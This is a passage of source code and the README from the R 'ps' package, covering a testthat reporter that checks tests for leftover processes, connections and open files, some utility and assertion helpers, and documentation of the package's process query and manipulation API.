          private$rconns <- showConnections()
        }
        if (private$proc_unit == "testsuite") {
          private$tree_id <- ps::ps_mark_tree()
        }
        if (private$conn_unit == "testsuite") {
          private$conns <- ps_connections(ps_handle())
        }
      },

      end_reporter = function() {
        super$end_reporter()
        if (private$proc_unit == "testsuite") {
          self$do_proc_cleanup("testsuite", quote = "")
        }
        if (private$rconn_unit == "testsuite") {
          self$do_rconn_cleanup("testsuite", quote = "")
        }
        if (private$file_unit == "testsuite") {
          self$do_file_cleanup("testsuite", quote = "")
        }
        if (private$conn_unit == "testsuite") {
          self$do_conn_cleanup("testsuite", quote = "")
        }
      },

      do_proc_cleanup = function(test, quote = "'") {
        Sys.unsetenv(private$tree_id)
        deadline <- Sys.time() + private$proc_timeout / 1000
        if (private$proc_fail) {
          while (
            length(ret <- ps::ps_find_tree(private$tree_id)) &&
              Sys.time() < deadline
          ) {
            Sys.sleep(0.05)
          }
          # maybe gc() will clean up something
          if (length(ret) > 0) {
            gc()
            ret <- ps::ps_find_tree(private$tree_id)
          }
        }
        if (private$proc_cleanup) {
          ret <- ps::ps_kill_tree(private$tree_id)
        }
        if (private$proc_fail && !private$has_error) {
          testthat::with_reporter(self, start_end_reporter = FALSE, {
            self$expect_cleanup(test, ret, quote)
          })
        }
      },

      do_rconn_cleanup = function(test, quote = "'") {
        old <- private$rconns
        new <- showConnections()
        private$rconns <- NULL
        leftover <- !new[, "description"] %in% old[, "description"]

        # maybe gc() will clean up some
        if (sum(leftover) > 0) {
          gc()
          new <- showConnections()
          leftover <- !new[, "description"] %in% old[, "description"]
        }

        if (private$rconn_cleanup) {
          for (no in as.integer(rownames(new)[leftover])) {
            tryCatch(close(getConnection(no)), error = function(e) NULL)
          }
        }

        if (private$rconn_fail && !private$has_error) {
          act <- testthat::quasi_label(rlang::enquo(test), test)
          testthat::expect(
            sum(leftover) == 0,
            sprintf(
              "%s did not close R connections: %s",
              encodeString(act$lab, quote = quote),
              paste0(
                encodeString(new[leftover, "description"], quote = "'"),
                " (",
                rownames(new)[leftover],
                ")",
                collapse = ",  "
              )
            )
          )
        }
      },

      do_file_cleanup = function(test, quote = "'") {
        old <- private$files
        new <- ps_open_files(ps_handle())
        private$files <- NULL
        leftover <- !new$path %in% old$path

        ## Need to ignore some open files:
        ## * /dev/urandom might be opened internally by curl, openssl, etc.
        leftover <- leftover & new$path != "/dev/urandom"

        # maybe gc() will clean up some
        if (sum(leftover) > 0) {
          gc()
          new <- ps_open_files(ps_handle())
          leftover <- !new$path %in% old$path
          leftover <- leftover & new$path != "/dev/urandom"
        }

        if (private$file_fail && !private$has_error) {
          act <- testthat::quasi_label(rlang::enquo(test), test)
          testthat::expect(
            sum(leftover) == 0,
            sprintf(
              "%s did not close open files: %s",
              encodeString(act$lab, quote = quote),
              paste0(
                encodeString(new$path[leftover], quote = "'"),
                collapse = ",  "
              )
            )
          )
        }
      },

      do_conn_cleanup = function(test, quote = "'") {
        old <- private$conns[, 1:6]
        private$conns <- NULL

        ## On windows, sometimes it takes time to remove the connection
        ## from the processes connection tables, so we try waiting a bit.
        ## We haven't seen issues with this on other OSes yet.
        deadline <- Sys.time() + as.difftime(0.5, units = "secs")
        done <- FALSE
        repeat {
          new <- ps_connections(ps_handle())[, 1:6]
          ## This is a connection that is used internally on macOS,
          ## for DNS resolution. We'll just ignore it. Looks like this:
          ## # A data frame: 2 x 6
          ##    fd family  type        laddr lport raddr
          ## <int> <chr>   <chr>       <chr> <int> <chr>
          ##     7 AF_UNIX SOCK_STREAM <NA>     NA /var/run/mDNSResponder
          ##    10 AF_UNIX SOCK_STREAM <NA>     NA /var/run/mDNSResponder
          new <- new[
            new$family != "AF_UNIX" |
              new$type != "SOCK_STREAM" |
              is.na(new$raddr) |
              paste(tolower(basename(new$raddr))) != "mdnsresponder",
          ]

          leftover <- !apply(new, 1, paste, collapse = "&") %in%
            apply(old, 1, paste, collapse = "&")

          # is this the final try, or are we all clean?
          if (done || sum(leftover) == 0) {
            break
          }

          # if Unix, then try again after gc()
          # on Windows, gc() after a timeout, then quit
          if (!ps_os_type()[["WINDOWS"]] || Sys.time() >= deadline) {
            gc()
            done <- TRUE
            next
          }

          Sys.sleep(0.05)
        }

        if (private$conn_fail && !private$has_error) {
          left <- new[leftover, ]
          act <- testthat::quasi_label(rlang::enquo(test), test)
          testthat::expect(
            sum(leftover) == 0,
            sprintf(
              "%s did not close network connections: \n%s",
              encodeString(act$lab, quote = quote),
              paste(format(left), collapse = "\n")
            )
          )
        }
      },

      expect_cleanup = function(test, pids, quote) {
        act <- testthat::quasi_label(rlang::enquo(test), test)
        act$pids <- length(pids)
        testthat::expect(
          length(pids) == 0,
          sprintf(
            "%s did not clean up processes: %s",
            encodeString(act$lab, quote = quote),
            paste0(
              encodeString(names(pids), quote = "'"),
              " (",
              pids,
              ")",
              collapse = ", "
            )
          )
        )

        invisible(act$val)
      }
    ),

    private = list(
      proc_unit = NULL,
      proc_cleanup = NULL,
      proc_fail = NULL,
      proc_timeout = NULL,

      rconn_unit = NULL,
      rconn_cleanup = NULL,
      rconn_fail = NULL,
      rconns = NULL,

      file_unit = NULL,
      file_fail = NULL,
      files = NULL,

      conn_unit = NULL,
      conn_fail = NULL,
      conns = NULL,

      tree_id = NULL,

      has_error = FALSE
    )
  )
}
````

### `pscheck/ps/R/utils.R`

````r
`%||%` <- function(l, r) if (is.null(l)) r else l

`%&&%` <- function(l, r) if (is.null(l)) NULL else r

not_null <- function(x) x[!map_lgl(x, is.null)]

not_zchar <- function(x) x[x != ""]

map_chr <- function(.x, .f, ...) {
  vapply(X = .x, FUN = .f, FUN.VALUE = character(1), ...)
}

map_lgl <- function(.x, .f, ...) {
  vapply(X = .x, FUN = .f, FUN.VALUE = logical(1), ...)
}

map_int <- function(.x, .f, ...) {
  vapply(X = .x, FUN = .f, FUN.VALUE = integer(1), ...)
}

map_dbl <- function(.x, .f, ...) {
  vapply(X = .x, FUN = .f, FUN.VALUE = double(1), ...)
}

parse_envs <- function(x) {
  x <- enc2utf8(x)
  x <- strsplit(x, "=", fixed = TRUE)
  nms <- map_chr(x, "[[", 1)
  vls <- map_chr(x, function(x) paste(x[-1], collapse = "="))
  ord <- order(nms)
  structure(vls[ord], names = nms[ord], class = "Dlist")
}

## These two are fully vectorized

str_starts_with <- function(x, p) {
  ncp <- nchar(p)
  substr(x, 1, nchar(p)) == p
}

str_strip <- function(x) {
  sub("\\s+$", "", sub("^\\s+", "", x))
}

str_tail <- function(x, num) {
  nc <- nchar(x)
  substr(x, pmax(nc - num + 1, 1), nc)
}

r_version <- function(x) {
  v <- paste0(version[["major"]], ".", version[["minor"]])
  package_version(v)
}

file_size <- function(x) {
  if (r_version() >= "3.2.0") {
    file.info(x, extra_cols = FALSE)$size
  } else {
    file.info(x)$size
  }
}

format_unix_time <- function(z) {
  structure(z, class = c("POSIXct", "POSIXt"), tzone = "GMT")
}

NA_time <- function() {
  x <- Sys.time()
  x[] <- NA
  x
}

fallback <- function(expr, alternative) {
  tryCatch(
    expr,
    error = function(e) alternative
  )
}

read_lines <- function(path) {
  suppressWarnings(con <- file(path, open = "r"))
  on.exit(close(con), add = TRUE)
  suppressWarnings(readLines(con))
}

## We need to wait until the child becomes a zombie, otherwise
## it might still be in a running state

zombie <- function() {
  if (ps_os_type()[["POSIX"]]) {
    pid <- .Call(psp__zombie)
    ps <- ps_handle(pid)
    timeout <- Sys.time() + 5
    while (ps_status(ps) != "zombie" && Sys.time() < timeout) {
      Sys.sleep(0.05)
    }
    if (ps_status(ps) == "zombie") pid else stop("Cannot create zombie")
  }
}

waitpid <- function(pid) {
  if (ps_os_type()[["POSIX"]]) .Call(psp__waitpid, as.integer(pid))
}

caps <- function(x) {
  paste0(toupper(substr(x, 1, 1)), tolower(substr(x, 2, nchar(x))))
}

assert_string <- function(x) {
  if (is.character(x) && length(x) == 1 && !is.na(x)) {
    return()
  }
  stop(ps__invalid_argument(
    match.call()$x,
    " is not a string (character scalar)"
  ))
}

assert_integer <- function(x) {
  x <- tryCatch(
    suppressWarnings(as.integer(x)),
    error = function(e) x
  )
  if (is.integer(x) && length(x) == 1 && !is.na(x)) {
    return(x)
  }
  stop(ps__invalid_argument(match.call()$x, " is not a scalar integer"))
}

assert_character <- function(x) {
  if (is.character(x)) {
    return()
  }
  stop(ps__invalid_argument(match.call()$x, " is not of type character"))
}

assert_pid <- function(x) {
  if (is.integer(x) && length(x) == 1 && !is.na(x)) {
    return(x)
  }
  if (is.numeric(x) && length(x) == 1 && !is.na(x) && as.integer(x) == x) {
    return(as.integer(x))
  }
  if (
    is.character(x) &&
      length(x) == 1 &&
      !is.na(x) &&
      grepl("^[A-Za-z][A-Za-z0-9]{11}$", x)
  ) {
    return(x)
  }
  stop(ps__invalid_argument(
    match.call()$x,
    " is not a process id (integer scalar) or process string (from `ps_string()`)"
  ))
}

assert_grace <- function(x) {
  if (is.integer(x) && length(x) == 1 && !is.na(x) && x >= 0) {
    return(x)
  }
  if (is.numeric(x) && length(x) == 1 && !is.na(x) && x >= 0) {
    xi <- as.integer(x)
    # if x is non-zero, then return non-zero
    if (xi == 0 && x > 0) {
      return(1)
    }
    return(as.integer(x))
  }
  stop(ps__invalid_argument(match.call()$x, " is not a non-negative integer"))
}

assert_time <- function(x) {
  if (inherits(x, "POSIXct")) {
    return()
  }
  stop(ps__invalid_argument(match.call()$x, " must be a time stamp (POSIXt)"))
}

assert_ps_handle <- function(x) {
  if (inherits(x, "ps_handle")) {
    return()
  }
  stop(ps__invalid_argument(
    match.call()$x,
    " must be a process handle (ps_handle)"
  ))
}

assert_ps_handle_list <- function(x) {
  if (all(map_lgl(x, inherits, "ps_handle"))) {
    return()
  }
  stop(ps__invalid_argument(
    match.call()$x,
    " must be a process handle (ps_handle) or a list of process handles"
  ))
}

assert_ps_handle_or_handle_list <- function(p) {
  if (!is.list(p)) {
    assert_ps_handle(p)
    p <- list(p)
  } else {
    assert_ps_handle_list(p)
  }
  p
}

assert_flag <- function(x) {
  if (is.logical(x) && length(x) == 1 && !is.na(x)) {
    return()
  }
  stop(ps__invalid_argument(match.call()$x, " is not a flag (logical scalar)"))
}

assert_signal <- function(x) {
  if (
    is.integer(x) && length(x) == 1 && !is.na(x) && x %in% unlist(signals())
  ) {
    return()
  }
  stop(ps__invalid_argument(
    match.call()$x,
    " is not a signal number (see ?signals())"
  ))
}

assert_nice_value <- function(x) {
  if (ps_os_type()[["POSIX"]]) {
    if (is.integer(x) && length(x) == 1 && !is.na(x) && x <= 20) {
      return()
    }
    stop(ps__invalid_argument(match.call()$x, " is not a valid priority value"))
  } else {
    match.arg(x, ps_windows_nice_values())
  }
}

realpath <- function(x) {
  if (ps_os_type()[["WINDOWS"]]) .Call(psw__realpath, x) else normalizePath(x)
}

get_tool <- function(prog) {
  if (ps_os_type()[["WINDOWS"]]) {
    prog <- paste0(prog, ".exe")
  }
  exe <- system.file(package = "ps", "bin", .Platform$r_arch, prog)
  if (exe == "") {
    pkgpath <- system.file(package = "ps")
    if (basename(pkgpath) == "inst") {
      pkgpath <- dirname(pkgpath)
    }
    exe <- file.path(pkgpath, "src", prog)
    if (!file.exists(exe)) return("")
  }
  exe
}

match_names <- function(map, x) {
  names(map)[match(x, map)]
}

is_cran_check <- function() {
  if (identical(Sys.getenv("NOT_CRAN"), "true")) {
    FALSE
  } else {
    Sys.getenv("_R_CHECK_PACKAGE_NAME_", "") != ""
  }
}
````

### `pscheck/ps/README.md`

````text

# ps

> List, Query, Manipulate System Processes

<!-- badges: start -->
[![lifecycle](https://lifecycle.r-lib.org/articles/figures/lifecycle-stable.svg)](https://lifecycle.r-lib.org/articles/stages.html)
[![R-CMD-check](https://github.com/r-lib/ps/actions/workflows/R-CMD-check.yaml/badge.svg)](https://github.com/r-lib/ps/actions/workflows/R-CMD-check.yaml)
[![CRAN status](https://www.r-pkg.org/badges/version/ps)](https://cran.r-project.org/package=ps)
[![CRAN RStudio mirror downloads](https://cranlogs.r-pkg.org/badges/ps)](https://www.r-pkg.org/pkg/ps)
[![Codecov test coverage](https://codecov.io/gh/r-lib/ps/graph/badge.svg)](https://app.codecov.io/gh/r-lib/ps)
<!-- badges: end -->

ps implements an API to query and manipulate system processes. Most of its
code is based on the [psutil](https://github.com/giampaolo/psutil) Python
package.


-   [Installation](#installation)
-   [Supported platforms](#supported-platforms)
-   [Listing all processes](#listing-all-processes)
-   [Process API](#process-api)
    -   [Query functions](#query-functions)
    -   [Process manipulation](#process-manipulation)
-   [Finished and zombie processes](#finished-and-zombie-processes)
-   [Pid reuse](#pid-reuse)
-   [Recipes](#recipes)
    -   [Find process by name](#find-process-by-name)
    -   [Wait for a process to finish](#wait-for-a-process-to-finish)
    -   [Wait for several processes to
        finish](#wait-for-several-processes-to-finish)
    -   [Kill process tree](#kill-process-tree)
    -   [Filtering and sorting
        processes](#filtering-and-sorting-processes)
-   [Code of Conduct](#code-of-conduct)
-   [License](#license)

## Installation

You can install the released version of ps from
[CRAN](https://CRAN.R-project.org) with:

``` r
install.packages("ps")
```

If you need the development version, install it with

``` r
pak::pak("r-lib/ps")
```

``` r
library(ps)
library(pillar) # nicer printing of data frames
```

## Supported platforms

ps currently supports Windows (from Vista), macOS and Linux systems. On
unsupported platforms the package can be installed and loaded, but all
of its functions fail with an error of class `"not_implemented"`.

## Listing all processes

`ps_pids()` returns all process ids on the system. This can be useful to
iterate over all processes.

``` r
ps_pids()[1:20]
```

    ##  [1]   0   1 265 266 275 276 557 559 561 562 564 567 569 570 574 578 580 584 586 587

`ps()` returns a data frame, with data about each process. It contains a
handle to each process, in the `ps_handle` column, you can use these to
perform more queries on the processes.

``` r
ps()
```

    ## # A data frame: 572 × 11
    ##      pid  ppid name      username status   user system    rss     vms created             ps_handle 
    ##  * <int> <int> <chr>     <chr>    <chr>   <dbl>  <dbl>  <dbl>   <dbl> <dttm>              <I<list>> 
    ##  1 45911  4159 Google C… gaborcs… sleep… 0.0473 0.0227 1.05e8 1.91e12 2025-04-28 08:05:25 <ps_handl>
    ##  2 45860  4159 Google C… gaborcs… sleep… 0.0751 0.0347 1.21e8 1.91e12 2025-04-28 08:05:19 <ps_handl>
    ##  3 45700     1 mdworker… gaborcs… sleep… 0.327  0.0861 2.88e7 4.37e11 2025-04-28 08:04:26 <ps_handl>
    ##  4 44844 39673 R         gaborcs… runni… 1.70   0.634  2.55e8 4.22e11 2025-04-28 08:01:34 <ps_handl>
    ##  5 44738  4159 Google C… gaborcs… sleep… 0.0325 0.0157 4.77e7 4.89e11 2025-04-28 08:00:51 <ps_handl>
    ##  6 43786     1 Messages… gaborcs… sleep… 0.162  0.233  6.90e6 4.37e11 2025-04-28 07:59:53 <ps_handl>
    ##  7 43785     1 business… gaborcs… sleep… 0.110  0.112  8.72e6 4.37e11 2025-04-28 07:59:53 <ps_handl>
    ##  8 43628     1 MENotifi… gaborcs… sleep… 0.0291 0.0116 3.08e6 4.21e11 2025-04-28 07:59:35 <ps_handl>
    ##  9 43627     1 MTLAsset… gaborcs… sleep… 0.0498 0.0208 3.29e6 4.37e11 2025-04-28 07:59:35 <ps_handl>
    ## 10 43472     1 replayd   gaborcs… sleep… 2.32   0.560  2.46e7 4.37e11 2025-04-28 07:59:21 <ps_handl>
    ## # ℹ 562 more rows

## Process API

This is a short summary of the API. Please see the documentation of the
various methods for details, in particular regarding handles to finished
processes and pid reuse. See also “Finished and zombie processes” and
“pid reuse” below.

`ps_handle(pid)` creates a process handle for the supplied process id.
If `pid` is omitted, a handle to the calling process is returned:

``` r
p <- ps_handle()
p
```

    ## <ps::ps_handle> PID=44844, NAME=R, AT=2025-04-28 08:01:34.873763

### Query functions

`ps_pid(p)` returns the pid of the process.

``` r
ps_pid(p)
```

    ## [1] 44844

`ps_create_time()` returns the creation time of the process (according
to the OS).

``` r
ps_create_time(p)
```

    ## [1] "2025-04-28 08:01:34 GMT"

The process id and the creation time uniquely identify a process in a
system. ps uses them to make sure that it reports information about, and
manipulates the correct process.

`ps_is_running(p)` returns whether `p` is still running. It handles pid
reuse safely.

``` r
ps_is_running(p)
```

    ## [1] TRUE

`ps_ppid(p)` returns the pid of the parent of `p`.

``` r
ps_ppid(p)
```

    ## [1] 39673

`ps_parent(p)` returns a process handle to the parent process of `p`.

``` r
ps_parent(p)
```

    ## <ps::ps_handle> PID=39673, NAME=zsh, AT=2025-04-28 07:53:00.030062

`ps_name(p)` returns the name of the program `p` is running.

``` r
ps_name(p)
```

    ## [1] "R"

`ps_exe(p)` returns the full path to the executable the `p` is running.

``` r
ps_exe(p)
```

    ## [1] "/Library/Frameworks/R.framework/Versions/4.5-arm64/Resources/bin/exec/R"

`ps_cmdline(p)` returns the command line (executable and arguments) of
`p`.

``` r
ps_cmdline(p)
```

    ## [1] "/Library/Frameworks/R.framework/Versions/4.5-arm64/Resources/bin/exec/R"

`ps_status(p)` returns the status of the process. Possible values are OS
dependent, but typically there is `"running"` and `"stopped"`.

``` r
ps_status(p)
```

    ## [1] "running"

`ps_username(p)` returns the name of the user the process belongs to.

``` r
ps_username(p)
```

    ## [1] "gaborcsardi"

`ps_uids(p)` and `ps_gids(p)` return the real, effective and saved user
ids of the process. They are only implemented on POSIX systems.

``` r
if (ps_os_type()[["POSIX"]]) ps_uids(p)
```

    ##      real effective     saved 
    ##       501       501       501

``` r
if (ps_os_type()[["POSIX"]]) ps_gids(p)
```

    ##      real effective     saved 
    ##        20        20        20

`ps_cwd(p)` returns the current working directory of the process.

``` r
ps_cwd(p)
```

    ## [1] "/Users/gaborcsardi/works/ps"

`ps_terminal(p)` returns the name of the terminal of the process, if
any. For processes without a terminal, and on Windows it returns
`NA_character_`.

``` r
ps_terminal(p)
```

    ## [1] "/dev/ttys019"

`ps_environ(p)` returns the environment variables of the process.
`ps_environ_raw(p)` does the same, in a different form. Typically they
reflect the environment variables at the start of the process.

``` r
ps_environ(p)[c("TERM", "USER", "SHELL", "R_HOME")]
```

    ## TERM                          xterm-256color
    ## USER                          gaborcsardi
    ## SHELL                         /bin/zsh
    ## R_HOME                        /Library/Frameworks/R.framework/Versions/4.5-arm64/Resources

`ps_num_threads(p)` returns the current number of threads of the
process.

``` r
ps_num_threads(p)
```

    ## [1] 3

`ps_cpu_times(p)` returns the CPU times of the process, similarly to
`proc.time()`.

``` r
ps_cpu_times(p)
```

    ##            user          system   children_user children_system 
    ##       1.7681955       0.6514954              NA              NA

`ps_memory_info(p)` returns memory usage information. See the manual for
details.

``` r
ps_memory_info(p)
```

    ##          rss          vms      pfaults      pageins 
    ##    261783552 421933465600        41422           13

`ps_children(p)` lists all child processes (potentially recursively) of
the current process.

``` r
ps_children(ps_parent(p))
```

    ## [[1]]
    ## <ps::ps_handle> PID=39874, NAME=zsh, AT=2025-04-28 07:53:00.889347
    ## 
    ## [[2]]
    ## <ps::ps_handle> PID=44844, NAME=R, AT=2025-04-28 08:01:34.873763

`ps_num_fds(p)` returns the number of open file descriptors (handles on
Windows):

``` r
ps_num_fds(p)
```

    ## [1] 23

``` r
f <- file(tmp <- tempfile(), "w")
ps_num_fds(p)
```

    ## [1] 24

``` r
close(f)
unlink(tmp)
```

`ps_open_files(p)` lists all open files:

``` r
ps_open_files(p)
```

    ## # A data frame: 4 × 2
    ##      fd path                                                                              
    ##   <int> <chr>                                                                             
    ## 1     0 /dev/ttys019                                                                      
    ## 2     1 /dev/ttys019                                                                      
    ## 3     2 /dev/ttys019                                                                      
    ## 4    14 /private/var/folders/ph/fpcmzfd16rgbbk8mxvy9m2_h0000gn/T/RtmpoaXwPG/Rfaf2c3705b93c

``` r
f <- file(tmp <- tempfile(), "w")
ps_open_files(p)
```

    ## # A data frame: 5 × 2
    ##      fd path                                                                                
    ##   <int> <chr>                                                                               
    ## 1     0 /dev/ttys019                                                                        
    ## 2     1 /dev/ttys019                                                                        
    ## 3     2 /dev/ttys019                                                                        
    ## 4    14 /private/var/folders/ph/fpcmzfd16rgbbk8mxvy9m2_h0000gn/T/RtmpoaXwPG/Rfaf2c3705b93c  
    ## 5    23 /private/var/folders/ph/fpcmzfd16rgbbk8mxvy9m2_h0000gn/T/RtmpoaXwPG/fileaf2c58c42e5c

``` r
close(f)
unlink(tmp)
ps_open_files(p)
```

    ## # A data frame: 4 × 2
    ##      fd path                                                                              
    ##   <int> <chr>                                                                             
    ## 1     0 /dev/ttys019                                                                      
    ## 2     1 /dev/ttys019                                                                      
    ## 3     2 /dev/ttys019                                                                      
    ## 4    14 /private/var/folders/ph/fpcmzfd16rgbbk8mxvy9m2_h0000gn/T/RtmpoaXwPG/Rfaf2c3705b93c

### Process manipulation

`ps_suspend(p)` suspends (stops) the process. On POSIX it sends a
SIGSTOP signal. On Windows it stops all threads.

`ps_resume(p)` resumes the process. On POSIX it sends a SIGCONT signal.
On Windows it resumes all stopped threads.

`ps_send_signal(p)` sends a signal to the process. It is implemented on
POSIX systems only. It makes an effort to work around pid reuse.

`ps_terminate(p)` send SIGTERM to the process. On POSIX systems only.

`ps_kill(p)` terminates the process. Sends `SIGKILL` on POSIX systems,
uses `TerminateProcess()` on Windows. It make an effort to work around
pid reuse.

`ps_interrupt(p)` interrupts a process. It sends a `SIGINT` signal on
POSIX systems, and it can send a CTRL+C or a CTRL+BREAK event on
Windows.

## Finished and zombie processes

ps handles finished and Zombie processes as much as possible.

The essential `ps_pid()`, `ps_create_time()`, `ps_is_running()`
functions and the `format()` and `print()` methods work for all
processes, including finished and zombie processes. Other functions fail
with an error of class `"no_such_process"` for finished processes.

The `ps_ppid()`, `ps_parent()`, `ps_children()`, `ps_name()`,
`ps_status()`, `ps_username()`, `ps_uids()`, `ps_gids()`,
`ps_terminal()`, `ps_children()` and the signal sending functions work
properly for zombie processes. Other functions fail with
`"zombie_process"` error.

## Pid reuse

ps functions handle pid reuse as well as technically possible.

The query functions never return information about the wrong process,
even if the process has finished and its process id was re-assigned.

On Windows, the process manipulation functions never manipulate the
wrong process.

On POSIX systems, this is technically impossible, it is not possible to
send a signal to a process without creating a race condition. In ps the
time window of the race condition is very small, a few microseconds, and
the process would need to finish, *and* the OS would need to reuse its
pid within this time window to create problems. This is very unlikely to
happen.

## Recipes

In the spirit of [psutil
recipes](http://psutil.readthedocs.io/en/latest/#recipes).

### Find process by name

Using `ps()` and dplyr:

``` r
library(dplyr)
find_procs_by_name <- function(name) {
  ps() |>
    filter(name == !!name)  |>
    pull(ps_handle)
}

find_procs_by_name("R")
```

    ## [[1]]
    ## <ps::ps_handle> PID=44844, NAME=R, AT=2025-04-28 08:01:34.873763
    ## 
    ## [[2]]
    ## <ps::ps_handle> PID=32722, NAME=R, AT=2025-04-28 07:36:42.295781

Without creating the full table of processes:

``` r
find_procs_by_name <- function(name) {
  procs <- lapply(ps_pids(), function(p) {
    tryCatch({
      h <- ps_handle(p)
      if (ps_name(h) == name) h else NULL },
      no_such_process = function(e) NULL,
      access_denied = function(e) NULL
    )
  })
  procs[!vapply(procs, is.null, logical(1))]
  }

find_procs_by_name("R")
```

    ## [[1]]
    ## <ps::ps_handle> PID=32722, NAME=R, AT=2025-04-28 07:36:42.295781
    ## 
    ## [[2]]
    ## <ps::ps_handle> PID=44844, NAME=R, AT=2025-04-28 08:01:34.873763

### Wait for a process to finish

`ps_wait()`, from ps 1.8.0, implements a new way, efficient for waiting
on a list of processes, so this is now very easy:

``` r
px <- processx::process$new("sleep", "2")
p <- px$as_ps_handle()
ps_wait(p, 1000)
```

    ## [1] FALSE

``` r
ps_wait(p)
```

    ## [1] TRUE

### Wait for several processes to finish

Again, this is much simpler with `ps_wait()`, added in ps 1.8.0.

``` r
px1 <- processx::process$new("sleep", "10")
px2 <- processx::process$new("sleep", "10")
px3 <- processx::process$new("sleep", "1")
px4 <- processx::process$new("sleep", "1")

p1 <- px1$as_ps_handle()
p2 <- px2$as_ps_handle()
p3 <- px3$as_ps_handle()
p4 <- px4$as_ps_handle()

ps_wait(list(p1, p2, p3, p4), timeout = 2000)
```

    ## [1] FALSE FALSE  TRUE  TRUE

### Kill process tree

From ps 1.8.0, `ps_kill()` will first send `SIGTERM` signals on Unix,
and `SIGKILL` after a grace period, if needed.

Note, that some R IDEs, including RStudio, run a multithreaded R
process, and other threads may start processes as well.
`reap_children()` will clean up all these as well, potentially causing
the IDE to misbehave or crash.

``` r
kill_proc_tree <- function(pid, include_parent = TRUE, ...) {
  if (pid == Sys.getpid() && include_parent) stop("I refuse to kill myself")
  parent <- ps_handle(pid)
  children <- ps_children(parent, recursive = TRUE)
  if (include_parent) children <- c(children, list(parent))
  ps_kill(children, ...)
}

p1 <- processx::process$new("sleep", "10")
p2 <- processx::process$new("sleep", "10")
p3 <- processx::process$new("sleep", "10")
kill_proc_tree(Sys.getpid(), include_parent = FALSE)
```

    ## [1] "terminated" "terminated" "terminated" "terminated" "terminated"

### Filtering and sorting processes

Process name ending with “sh”:

``` r
ps() |>
  filter(grepl("sh$", name))
```

    ## # A data frame: 35 × 11
    ##      pid  ppid name        username    status      user  system     rss      vms created            
    ##    <int> <int> <chr>       <chr>       <chr>      <dbl>   <dbl>   <dbl>    <dbl> <dttm>             
    ##  1 41838     1 ReportCrash root        sleepi… NA       NA      NA      NA       2025-04-28 07:57:52
    ##  2 40290 40090 zsh         gaborcsardi sleepi…  0.0361   0.154   3.01e6  4.21e11 2025-04-28 07:53:47
    ##  3 40090 40088 zsh         gaborcsardi sleepi…  0.587    0.406   3.14e7  4.21e11 2025-04-28 07:53:47
    ##  4 39874 39673 zsh         gaborcsardi sleepi…  0.00552  0.0208  2.62e6  4.21e11 2025-04-28 07:53:00
    ##  5 39673 39672 zsh         gaborcsardi sleepi…  0.270    0.0922  2.96e7  4.21e11 2025-04-28 07:53:00
    ##  6 35995 35795 zsh         gaborcsardi sleepi…  0.0117   0.0485  9.67e5  4.21e11 2025-04-28 07:45:03
    ##  7 35795 35794 zsh         gaborcsardi sleepi…  0.236    0.128   1.69e6  4.21e11 2025-04-28 07:45:03
    ##  8 35595 35391 zsh         gaborcsardi sleepi…  0.00781  0.0332  9.67e5  4.21e11 2025-04-28 07:44:16
    ##  9 35391 35390 zsh         gaborcsardi sleepi…  0.262    0.115   1.69e6  4.21e11 2025-04-28 07:44:15
    ## 10 30303 30302 bash        gaborcsardi sleepi…  0.00806  0.0194  8.68e5  4.20e11 2025-04-28 07:32:12
    ## # ℹ 25 more rows
    ## # ℹ 1 more variable: ps_handle <I<list>>

Processes owned by user:

``` r
ps() |>
  filter(username == Sys.info()[["user"]]) |>
  select(pid, name)
```

    ## # A data frame: 347 × 2
    ##      pid name                           
    ##    <int> <chr>                          
    ##  1 45911 Google Chrome Helper (Renderer)
    ##  2 45860 Google Chrome Helper (Renderer)
    ##  3 45700 mdworker_shared                
    ##  4 44844 R                              
    ##  5 44738 Google Chrome Helper           
    ##  6 43786 MessagesBlastDoorService       
    ##  7 43785 businessservicesd              
    ##  8 43628 MENotificationAgent            
    ##  9 43627 MTLAssetUpgraderD              
    ## 10 43472 replayd                        
    ## # ℹ 337 more rows

Processes consuming more than 100MB of memory:

``` r
ps() |>
  filter(rss > 100 * 1024 * 1024)
```

    ## # A data frame: 20 × 11
    ##      pid  ppid name    username status    user  system    rss     vms created             ps_handle 
    ##    <int> <int> <chr>   <chr>    <chr>    <dbl>   <dbl>  <dbl>   <dbl> <dttm>              <I<list>> 
    ##  1 45911  4159 Google… gaborcs… sleep… 4.73e-2 2.27e-2 1.05e8 1.91e12 2025-04-28 08:05:25 <ps_handl>
    ##  2 45860  4159 Google… gaborcs… sleep… 7.51e-2 3.47e-2 1.21e8 1.91e12 2025-04-28 08:05:19 <ps_handl>
    ##  3 44844 39673 R       gaborcs… runni… 2.08e+0 9.20e-1 2.80e8 4.22e11 2025-04-28 08:01:34 <ps_handl>
    ##  4 40521  4159 Google… gaborcs… sleep… 3.14e+0 4.45e-1 2.03e8 1.91e12 2025-04-28 07:54:07 <ps_handl>
    ##  5 40037  4159 Google… gaborcs… sleep… 7.78e+0 1.03e+0 2.66e8 1.91e12 2025-04-28 07:53:23 <ps_handl>
    ##  6 39666  4159 Google… gaborcs… sleep… 1.30e+0 2.37e-1 1.45e8 1.91e12 2025-04-28 07:52:34 <ps_handl>
    ##  7 28176  4159 Google… gaborcs… sleep… 1.16e+1 1.09e+0 2.18e8 1.91e12 2025-04-28 07:23:37 <ps_handl>
    ##  8 18695  4159 Google… gaborcs… sleep… 2.33e+1 2.18e+0 2.23e8 1.91e12 2025-04-28 06:48:50 <ps_handl>
    ##  9 18673  4159 Google… gaborcs… sleep… 2.08e+1 1.73e+0 2.39e8 1.91e12 2025-04-28 06:47:44 <ps_handl>
    ## 10 18257  4159 Google… gaborcs… sleep… 2.11e+1 2.85e+0 2.02e8 1.91e12 2025-04-28 06:31:40 <ps_handl>
    ## 11 17380  4159 Google… gaborcs… sleep… 1.25e+1 1.50e+0 1.76e8 1.91e12 2025-04-28 05:48:24 <ps_handl>
    ## 12 16963  4159 Google… gaborcs… sleep… 4.73e+2 6.83e+1 5.52e8 1.91e12 2025-04-28 05:31:43 <ps_handl>
    ## 13  4214  4159 Google… gaborcs… sleep… 4.88e+0 1.34e+0 1.34e8 1.91e12 2025-04-26 23:27:03 <ps_handl>
    ## 14  4199  4159 Google… gaborcs… sleep… 1.26e+2 1.08e+1 3.45e8 1.91e12 2025-04-26 23:26:59 <ps_handl>
    ## 15  4176  4159 Google… gaborcs… sleep… 2.38e+2 2.31e+2 1.23e8 4.55e11 2025-04-26 23:26:58 <ps_handl>
    ## 16  4175  4159 Google… gaborcs… sleep… 2.05e+3 1.09e+3 1.35e8 4.56e11 2025-04-26 23:26:58 <ps_handl>
